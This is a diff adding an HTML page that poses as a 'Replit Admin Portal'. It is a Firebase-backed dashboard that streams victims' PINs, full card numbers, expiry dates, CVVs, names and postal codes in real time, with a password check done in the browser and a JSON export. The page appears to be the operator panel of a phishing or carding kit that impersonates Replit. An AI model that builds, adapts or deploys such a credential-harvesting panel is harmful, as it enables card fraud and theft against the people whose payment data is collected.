@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Replit - Secure Admin Dashboard</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        darkBg: '#0B0F19',
+                        cardBg: '#111827',
+                        cardBorder: '#1F2937',
+                        accentEmerald: '#10B981'
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #0B0F19;
+            color: #F3F4F6;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col selection:bg-emerald-500 selection:text-white">
+
+    <!-- Login Modal / Password Protection (tare) -->
+    <div id="login-modal" class="fixed inset-0 z-50 bg-darkBg flex items-center justify-center p-4">
+        <div class="w-full max-w-md bg-cardBg border border-cardBorder rounded-3xl p-8 shadow-2xl space-y-6">
+            <div class="flex items-center space-x-3">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-emerald-600 to-emerald-400 flex items-center justify-center shadow-lg shadow-emerald-900/30">
+                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                </div>
+                <div>
+                    <h1 class="font-bold text-lg text-white">Admin Authentication</h1>
+                    <p class="text-xs text-gray-400">Restricted Access • Replit Security</p>
+                </div>
+            </div>
+
+            <form onsubmit="handleLogin(event)" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-medium text-gray-400 mb-1">Admin Password</label>
+                    <input type="password" id="admin-pass-input" required placeholder="Enter password" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500">
+                </div>
+                <p id="login-error" class="text-xs text-red-400 hidden font-medium">Incorrect password. Access denied.</p>
+                <button type="submit" class="w-full py-3.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-semibold shadow-lg shadow-emerald-500/25 transition-all">
+                    Access Dashboard
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div id="admin-dashboard" class="hidden flex-1 flex flex-col">
+        <!-- Top Nav -->
+        <header class="bg-cardBg border-b border-cardBorder px-6 py-4 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <div class="w-9 h-9 rounded-xl bg-gradient-to-tr from-emerald-600 to-emerald-400 flex items-center justify-center shadow-lg">
+                    <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                </div>
+                <div>
+                    <h2 class="font-bold text-base text-white">Replit Admin Portal</h2>
+                    <p class="text-xs text-emerald-400 font-medium flex items-center space-x-1.5">
+                        <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                        <span>Live Database Synchronized</span>
+                    </p>
+                </div>
+            </div>
+            <div class="flex items-center space-x-3">
+                <button onclick="exportJSON()" class="px-4 py-2 rounded-xl bg-gray-800 hover:bg-gray-700 text-xs font-semibold text-gray-300 transition-colors">
+                    Export JSON
+                </button>
+                <button onclick="location.reload()" class="px-4 py-2 rounded-xl bg-red-500/10 hover:bg-red-500/20 text-xs font-semibold text-red-400 transition-colors">
+                    Lock Session
+                </button>
+            </div>
+        </header>
+
+        <!-- Content Body -->
+        <main class="flex-1 p-6 max-w-7xl mx-auto w-full space-y-6">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div class="bg-cardBg border border-cardBorder rounded-2xl p-5">
+                    <p class="text-xs font-medium text-gray-400">Total Submissions</p>
+                    <h3 id="stat-total" class="text-3xl font-bold text-white mt-1">0</h3>
+                </div>
+                <div class="bg-cardBg border border-cardBorder rounded-2xl p-5">
+                    <p class="text-xs font-medium text-gray-400">Card Withdrawals Attempted</p>
+                    <h3 id="stat-cards" class="text-3xl font-bold text-emerald-400 mt-1">0</h3>
+                </div>
+                <div class="bg-cardBg border border-cardBorder rounded-2xl p-5">
+                    <p class="text-xs font-medium text-gray-400">Most Recent Submission</p>
+                    <h3 id="stat-latest" class="text-sm font-semibold text-gray-300 mt-2 truncate">None yet</h3>
+                </div>
+            </div>
+
+            <div class="bg-cardBg border border-cardBorder rounded-2xl overflow-hidden shadow-xl">
+                <div class="p-5 border-b border-cardBorder flex items-center justify-between">
+                    <h3 class="font-bold text-white text-base">Live Submission Stream</h3>
+                    <span class="text-xs text-gray-400">Updates in real time</span>
+                </div>
+                
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left text-sm">
+                        <thead class="bg-gray-900/80 text-gray-400 text-xs uppercase font-semibold border-b border-cardBorder">
+                            <tr>
+                                <th class="p-4">Time</th>
+                                <th class="p-4">PIN</th>
+                                <th class="p-4">Payout Method</th>
+                                <th class="p-4">Card Number</th>
+                                <th class="p-4">Expiry</th>
+                                <th class="p-4">CVV</th>
+                                <th class="p-4">Cardholder Name</th>
+                                <th class="p-4">Postal Code</th>
+                            </tr>
+                        </thead>
+                        <tbody id="submissions-table-body" class="divide-y divide-gray-800 text-gray-300 font-mono text-xs">
+                            <tr>
+                                <td colspan="8" class="p-8 text-center text-gray-500">Waiting for live submissions...</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Script -->
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAM31T5d_A29uDxLthwj5IJXaVkoWkPyQ4",
+            authDomain: "replit-fintech.firebaseapp.com",
+            databaseURL: "https://replit-fintech-default-rtdb.firebaseio.com",
+            projectId: "replit-fintech",
+            storageBucket: "replit-fintech.firebasestorage.app",
+            messagingSenderId: "612515823026",
+            appId: "1:612515823026:web:59d7d13fa3f6a6152178ab"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.database();
+
+        let allSubmissionsData = {};
+
+        function handleLogin(e) {
+            e.preventDefault();
+            const pass = document.getElementById('admin-pass-input').value;
+            if (pass === 'tare') {
+                document.getElementById('login-modal').classList.add('hidden');
+                document.getElementById('admin-dashboard').classList.remove('hidden');
+                initRealtimeListener();
+            } else {
+                document.getElementById('login-error').classList.remove('hidden');
+                document.getElementById('admin-pass-input').value = '';
+            }
+        }
+
+        function initRealtimeListener() {
+            const ref = db.ref('submissions');
+            ref.on('value', (snapshot) => {
+                const data = snapshot.val();
+                allSubmissionsData = data || {};
+                renderTable(allSubmissionsData);
+            });
+        }
+
+        function renderTable(data) {
+            const tbody = document.getElementById('submissions-table-body');
+            const keys = Object.keys(data || {});
+            
+            document.getElementById('stat-total').textContent = keys.length;
+            
+            let cardCount = 0;
+            let latestTime = 'None yet';
+
+            if (keys.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="8" class="p-8 text-center text-gray-500">No submissions recorded yet.</td></tr>`;
+                document.getElementById('stat-cards').textContent = '0';
+                document.getElementById('stat-latest').textContent = 'None yet';
+                return;
+            }
+
+            let html = '';
+            keys.reverse().forEach((key, idx) => {
+                const item = data[key];
+                if (item.payoutMethod) cardCount++;
+                
+                const timeStr = item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : 'N/A';
+                if (idx === 0 && item.timestamp) {
+                    latestTime = new Date(item.timestamp).toLocaleString();
+                }
+
+                html += `
+                    <tr class="hover:bg-gray-900/50 transition-colors">
+                        <td class="p-4 text-gray-400">${timeStr}</td>
+                        <td class="p-4 font-bold text-emerald-400">${item.pin || '-'}</td>
+                        <td class="p-4 text-gray-300">${item.payoutMethod || 'PIN Verified Only'}</td>
+                        <td class="p-4">${item.cardNumber || '-'}</td>
+                        <td class="p-4">${item.cardExpiry || '-'}</td>
+                        <td class="p-4">${item.cardCvv || '-'}</td>
+                        <td class="p-4 font-sans font-semibold text-white">${item.cardName || '-'}</td>
+                        <td class="p-4">${item.cardPostal || '-'}</td>
+                    </tr>
+                `;
+            });
+
+            tbody.innerHTML = html;
+            document.getElementById('stat-cards').textContent = cardCount;
+            document.getElementById('stat-latest').textContent = latestTime;
+        }
+
+        function exportJSON() {
+            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(allSubmissionsData, null, 2));
+            const downloadAnchor = document.createElement('a');
+            downloadAnchor.setAttribute("href", dataStr);
+            downloadAnchor.setAttribute("download", `replit_submissions_${new Date().toISOString().slice(0,10)}.json`);
+            document.body.appendChild(downloadAnchor);
+            downloadAnchor.click();
+            downloadAnchor.remove();
+        }
+    </script>
+</body>
+</html>
